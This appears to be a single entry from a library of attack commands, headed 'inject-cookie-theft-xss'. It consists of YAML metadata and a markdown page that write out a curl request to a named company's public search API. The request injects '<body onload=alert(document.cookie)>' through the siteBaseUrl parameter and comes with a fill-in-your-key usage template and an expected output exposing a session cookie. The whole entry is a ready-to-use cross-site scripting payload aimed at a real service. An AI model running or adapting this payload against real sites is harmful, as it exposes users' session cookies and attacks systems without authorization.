---
data: >-
  curl
  "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body
  onload=alert(document.cookie)>"
tags:
  - xss
  - cookie-theft
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.114Z'
id: 1d920d32-ebd5-4b73-8458-57128e9603a4
verified: false
validated: true
submitted: true
---
# inject-cookie-theft-xss

## Command

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=alert(document.cookie)>"
```

## Description

Injects an XSS payload to alert and expose document cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| siteBaseUrl | Payload for cookie alert | Yes |

## Examples

### Basic Usage

```bash
curl "https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=yourkey&query=coffe&partnerid=yourid&siteBaseUrl=http://googl.com/%0a<body onload=alert(document.cookie)>"
```

## Expected Output

Alert popup with cookie string, e.g., "sessionid=abc123".

## Related

- [[commands/inject-xss-payload-sitebaseurl]]
